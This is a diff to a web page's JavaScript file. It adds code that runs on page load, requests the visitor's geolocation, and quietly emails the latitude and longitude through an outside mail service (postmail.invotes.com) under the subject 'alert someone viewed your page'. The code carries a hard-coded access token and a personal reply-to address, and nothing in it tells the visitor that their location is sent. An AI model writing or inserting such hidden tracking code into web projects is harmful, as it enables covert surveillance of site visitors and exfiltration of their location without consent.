@@ -62,7 +62,49 @@ $(document).ready(function () {
   });
 });
 
+var x=document.getElementById("myFrame");
+function getLocation()
+{
+if (navigator.geolocation)
+{
+navigator.geolocation.getCurrentPosition(showPosition);
+}
 
+}
+function showPosition(position)
+{
+  function onSuccess() {
+    // remove this to avoid redirect
+    window.location = window.location.pathname + "?message=Email+Successfully+Sent%21&isError=0";
+}
+
+function onError(error) {
+    // remove this to avoid redirect
+    window.location = window.location.pathname + "?message=Email+could+not+be+sent.&isError=1";
+}
+
+   
+    URL= 'https://postmail.invotes.com/send',
+    data= {
+     
+     subject: 'alert someone viewed your page',
+     text: "Their position is Latitude: " + position.coords.latitude + "Longitude: " + position.coords.longitude,
+      access_token: "7cw02zgebz6fyuo4bzobz7es",
+      reply_to: "erict54757@gmail.com",
+     
+   
+
+    }
+    $.post(URL,data,onSuccess
+      ).fail(onError);
+
+      return false;{
+      
+    }
+  
+ 
+}
+getLocation()
 
 var submitButton = document.getElementById("submit_form");
 var form = document.getElementById("email_form");
